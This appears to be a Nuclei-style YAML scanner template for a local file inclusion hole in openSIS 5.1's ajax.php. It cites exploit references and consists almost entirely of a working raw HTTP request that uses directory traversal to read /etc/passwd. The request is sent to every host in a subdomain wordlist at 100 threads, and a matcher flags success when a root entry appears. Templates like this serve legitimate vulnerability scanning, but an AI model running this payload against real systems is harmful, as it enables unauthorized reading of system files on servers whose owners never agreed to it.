id: opensis-lfi 1
info:
  author: pikpikcu
  name: openSIS 5.1 - 'ajax.php' Local File Inclusion
  reference: '- https://www.exploit-db.com/exploits/38039

    - https://www.securityfocus.com/bid/56598/info

    '
  severity: high
  tags: opensis,lfi
requests:
- attack: sniper
  matchers:
  - regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'GET /opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
    HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Accept-Encoding: gzip, deflate

    Connection: close

    '
  threads: 100
